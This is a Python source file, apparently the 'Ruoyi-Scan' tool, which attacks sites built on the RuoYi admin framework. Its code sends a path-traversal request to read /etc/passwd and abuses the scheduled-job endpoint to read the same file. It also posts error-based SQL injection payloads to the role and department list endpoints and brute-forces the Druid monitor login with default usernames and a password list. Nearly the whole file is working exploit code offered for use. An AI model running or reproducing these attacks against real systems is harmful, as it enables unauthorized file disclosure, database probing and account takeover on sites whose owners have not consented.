# 目录扫描
# POC编写
# 登录框爆破
import re

import sys
import requests

class RUOYI_SCAN:
    def function(self):
        print('''\033[32m
  ____                            _     ____                         
 |  _ \   _   _    ___    _   _  (_)   / ___|    ___    __ _   _ __  
 | |_) | | | | |  / _ \  | | | | | |   \___ \   / __|  / _` | | '_ \ 
 |  _ <  | |_| | | (_) | | |_| | | |    ___) | | (__  | (_| | | | | |
 |_| \_\  \__,_|  \___/   \__, | |_|   |____/   \___|  \__,_| |_| |_|
                          |___/         
                                            
---Ruoyi-Scan&Version:1.0.0\033[33m                      
[*]By.XiaBai                                     
[*]一款用于针对Ruoyi系统框架的综合漏洞扫描工具
[*]Github:https://www.github.com/xueshanchengke/Ruoyi-Scan
[*]联系方式:暂无QAQ\033[0m''')
        self.headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0'
        }
    #-------------------------------------------------------------------------------------------------------------------
    def scan(self):
        self.url = sys.argv[2]
        if self.url[-1] != '/':
            self.url += '/'
        if sys.argv[1] == '-h':
            print('-----------------------------------------------------------------------------------------')
            print('-u : 综合扫描')
            print('-m : 目录扫描')
            print('-p : 漏洞检测')
            print('-l : 登录爆破')
            print('-----------------------------------------------------------------------------------------')
            return None
        if sys.argv[1] == '-u':
            print('\033[33m[*]当前扫描模式:[\033[31m综合扫描\033[33m]\033[0m')
            self.path_scan()
            self.poc_scan()
            self.web_login()
        elif sys.argv[1] == '-m':
            print('\033[33m[*]当前扫描模式:[\033[32m目录扫描\033[33m]\033[0m')
            self.path_scan()
        elif sys.argv[1] == '-p':
            print('\033[33m[*]当前扫描模式:[\033[32m漏洞扫描\033[33m]\033[0m')
            self.poc_scan()
        elif sys.argv[1] == '-l':
            print('\033[33m[*]当前扫描模式:[\033[32m登录爆破\033[33m]\033[0m')
            self.web_login()
    #-------------------------------------------------------------------------------------------------------------------
    def path_scan(self):
        print('-----------------------------------------------------------------------------------------')
        with open(r"ruoyi.txt", 'r', encoding='utf-8') as f:
            path_list = f.read().splitlines()
        for path in path_list:
            if self.url[-1] == '/' and path[0] == '/':
                path = path[1:]
            respnse = requests.get(self.url + path, headers=self.headers)
            title = re.findall('<title>(\w+)</title>', respnse.text)
            if len(title) < 1:
                title = '\033[31mNULL\033[0m'
            else:
                title = '\033[32m' + title[0] + '\033[0m'
            code = str(respnse.status_code)
            if '20' in code:
                code = '\033[32m' + code + '\033[0m'
            else:
                code = '\033[31m' + code + '\033[0m'
            print(f'[*]\033[33m响应:[{code}\033[33m] -> 标题:[{title}\033[33m] -> 长度:[\033[32m{len(respnse.text)}\033[33m] -> {respnse.request.url}\033[0m')
    #-------------------------------------------------------------------------------------------------------------------
    def poc_scan(self):
        print('-----------------------------------------------------------------------------------------')
        # 任意文件读取
        def file_read():
            file_read_use = requests.get(
                self.url + '/common/download/resource?resource=/profile/../../../../../../../etc/passwd',
                headers=self.headers).text
            if 'root' in file_read_use and ':/' in file_read_use:
                print('\033[32m[*]存在任意文件读取漏洞\033[0m')
            else:
                print('\033[31m[/]不存在任意文件读取漏洞\033[0m')

        # 定时任务任意文件读取
        def file_read_time():
            headers = {
                'accept': '/',
                'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)',
                'Cookie': 'JSESSIONID=6db3d8ea-2d5c-490e-9863-6ef864b99828',
                'Host': self.url.split('://')[-1],
                'Connection': 'close',
                'Content-type': 'application/x-www-form-urlencoded',
                'Content-Length': "187"
            }
            data = {"jobId": "4", "updateBy": "admin", "jobName": "beb528e3", "jobGroup": "DEFAULT",
                    "invokeTarget": "ruoYiConfig.setProfile('/etc/passwd')", "cronExpression": "0%2F10+++++%3F",
                    "misfirePolicy": "1", "concurrent": "1", "status": "1", "remark": ""}
            create_time_task = requests.post(self.url + '/monitor/job/edit', headers=headers, data=data)
            headers = {
                'accept': '/',
                'user-agent': 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)',
                'Cookie': 'JSESSIONID=6db3d8ea-2d5c-490e-9863-6ef864b99828',
                'Host': self.url.split('://')[-1],
                'Connection': 'close',
                'Content-type': 'application/x-www-form-urlencoded',
                'Content-Length': "7"
            }
            run_time_task = requests.post(self.url + '/monitor/job/run', headers=headers, data={'jobId': '4'})
            file_install = requests.get(self.url + '/common/download/resource?resource=2.txt',
                                        headers=self.headers).text
            if 'root' in file_install and ':/' in file_install:
                print('\033[32m[*]存在定时任务任意文件读取漏洞\033[0m')
            else:
                print('\033[31m[/]不存在定时任务任意文件读取漏洞\033[0m')

        # SQL注入POST
        def sql_inject_role():
            headers = {
                "Host": self.url.split('://')[-1],
                "nt": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:98.0) Gecko/20100101 Firefox/98.0",
                "Accept": "application/json, text/javascript, */*; q=0.01",
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Length": "181",
                "Origin": "http://{}".format(self.url.split('://')[-1]),
                "Connection": "close",
                "Referer": "http://{}/system/role".format(self.url.split('://')[-1]),
                "Cookie": "UMK8_2132_ulastactivity=fdf6lh5P4KaIR7rPwncVmGmx5z2ymLLNz3o33msgkFJlQ1SdH/hR; UMK8_2132_lastcheckfeed=1|1637287051; UMK8_2132_nofavfid=1; JSESSIONID=d9eca4a4-7fcd-41ba-9888-75e7c73dc9bf",
                "Sec-Fetch-Dest": "empty",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Site": "same-origin",
            }
            data = {
                'pageSize': '',
                'pageNum': '',
                'orderByColumn': '',
                'isAsc': '',
                'roleName': '',
                'roleKey': '',
                'status': '',
                'params[beginTime]': '',
                'params[endTime]': '',
                'params[dataScope]': 'and extractvalue(1,concat(0x7e,(select database()),0x7e))'
            }
            sql_inject = requests.post(self.url + '/system/role/list', headers=headers, data=data).text
            if '运行时异常' in sql_inject or 'database()' in sql_inject:
                print('\033[32m[*]存在POST型报错注入\033[0m')
            else:
                print('\033[31m[/]不存在POST型报错注入\033[0m')

        # SQL注入POST2方法
        def sql_inject_dept():
            headers = {
                "Host": self.url.split('://')[-1],
                "Content-Type": "application/x-www-form-urlencoded",
                "Accept-Language": "zh-CN,zh;q=0.9",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Upgrade-Insecure-Requests": "1",
                "sec-ch-ua": "Chromium;v=122, Not(A:Brand;v=24, Google Chrome;v=122",
                "Connection": "keep-alive",
                "Sec-Fetch-Dest": "document",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36",
                "Cookie": "",
                "sec-ch-ua-mobile": "?0",
                "Sec-Fetch-User": "?1",
                "sec-ch-ua-platform": "Windows",
                "Accept": "text/html,application/xhtml xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "Content-Length": "0"
            }
            data = {"params[dataScope]": "and extractvalue(1, concat(0x7e,(select database()),0x7e))"}
            sql_inject = requests.post(self.url + '/system/dept/list', headers=headers, data=data)
            if '运行时异常' in sql_inject or 'database()' in sql_inject:
                print('\033[32m[*]存在第二种POST型报错注入\033[0m')
            else:
                print('\033[31m[/]不存在其他POST型报错注入\033[0m')

        file_read()
        file_read_time()
        sql_inject_role()
        sql_inject_dept()
    #-------------------------------------------------------------------------------------------------------------------
    def web_login(self):
        print('-----------------------------------------------------------------------------------------')
        user_list = ['ruoyi', 'druid', 'admin', 'admin123', 'auth', '123456']
        for user in user_list:
            with open(r"password.txt", 'r', encoding='utf-8') as f:
                password_list = f.read().splitlines()
            for password in password_list:
                data = {
                    "loginUsername": user,
                    "loginPassword": password
                }
                login_response = requests.post(self.url + 'druid/submitLogin', headers=self.headers, data=data)
                if 'success' in login_response.text:
                    print(f'\033[32m[*]登录成功,用户名:{user},密码:{password}\033[0m')
                    return None
                else:
                    print(f'\033[32m[*]登录失败,用户名:{user},密码:{password}\033[0m')
#--------------------------------------------------
# 控制台
ruoyi_scan = RUOYI_SCAN()
ruoyi_scan.function()
ruoyi_scan.scan()
input('[*]工作完毕,感谢你的使用,回车退出.../')
